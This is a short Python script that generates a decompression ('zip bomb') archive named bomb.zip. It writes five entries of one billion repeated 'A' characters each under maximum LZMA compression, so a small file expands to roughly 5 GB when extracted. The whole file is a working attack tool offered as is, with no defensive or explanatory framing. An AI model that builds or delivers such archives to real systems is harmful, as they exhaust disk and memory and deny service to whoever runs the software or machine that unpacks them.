from zipfile import ZIP_LZMA, ZipFile

from tqdm import tqdm

ZIP_NAME: str = "bomb.zip"
TXT_NAME: str = "info{}.txt"
CONTENT: str = "A" * 1_000_000_000
COUNT: int = 5  # GB


def main() -> None:
    with ZipFile(ZIP_NAME, "w", compression=ZIP_LZMA, compresslevel=9) as zip:
        for index in tqdm(range(COUNT)):
            zip.writestr(TXT_NAME.format(index + 1), CONTENT)


if __name__ == "__main__":
    main()